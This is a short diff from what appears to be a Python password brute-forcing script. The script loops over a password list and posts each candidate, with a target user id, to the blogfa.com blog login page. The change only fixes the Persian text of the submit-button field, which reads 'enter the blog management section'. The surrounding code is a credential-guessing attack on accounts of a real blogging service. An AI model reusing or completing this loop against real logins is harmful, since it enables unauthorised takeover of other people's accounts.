@@ -160,7 +160,7 @@ for __PASS__ in pas:
     __PAYLOAD__ = {"_tt":t_t,
 "usrid":tar,
 "ups":__PASS__,
-"btnSubmit":"????+??+???+??????+?????"}
+"btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}
 
     _REQS_ = rq.post('https://blogfa.com/desktop/login.aspx', data=__PAYLOAD__, headers=__HEDBLOG__)
     _rqPOST_ = (_REQS_).text
